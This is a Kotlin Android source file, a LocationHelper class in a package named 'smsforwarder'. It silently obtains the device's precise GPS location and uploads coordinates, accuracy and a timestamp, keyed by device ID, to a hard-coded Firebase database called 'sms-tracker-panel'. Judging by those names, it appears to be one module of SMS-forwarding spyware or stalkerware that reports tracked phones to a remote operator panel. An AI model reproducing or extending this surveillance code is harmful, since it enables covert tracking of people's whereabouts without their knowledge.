package com.smsforwarder

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import androidx.core.content.ContextCompat
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.firebase.database.FirebaseDatabase

class LocationHelper(private val context: Context) {

    private val fusedClient = LocationServices.getFusedLocationProviderClient(context)
    private val deviceId = DeviceUtils.getUniqueDeviceId(context)

    companion object {
        private const val FIREBASE_URL = "https://sms-tracker-panel-default-rtdb.asia-southeast1.firebasedatabase.app/"
    }

    fun fetchAndUploadLocation() {
    if (ContextCompat.checkSelfPermission(
            context, Manifest.permission.ACCESS_FINE_LOCATION
        ) != PackageManager.PERMISSION_GRANTED
    ) return

    try {
        // Pehle last known try karo
        fusedClient.lastLocation.addOnSuccessListener { location ->
            if (location != null && location.accuracy <= 100) {
                // Agar accuracy theek hai to yahi use karo
                uploadLocationToFirebase(location)
            } else {
                // Warna high accuracy current location maango
                fusedClient.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null)
                    .addOnSuccessListener { currLocation ->
                        currLocation?.let { uploadLocationToFirebase(it) }
                    }
                    .addOnFailureListener {
                        // Agar current bhi fail ho jaye to last known bhej do (agar thi)
                        location?.let { uploadLocationToFirebase(it) }
                    }
            }
        }
    } catch (e: Exception) {
        e.printStackTrace()
    }
}

    private fun uploadLocationToFirebase(location: Location) {
        val data = mapOf(
            "latitude" to location.latitude,
            "longitude" to location.longitude,
            "accuracy" to location.accuracy,
            "timestamp" to System.currentTimeMillis()
        )
        FirebaseDatabase.getInstance(FIREBASE_URL)
            .getReference("devices/$deviceId/location")
            .setValue(data)
    }
}
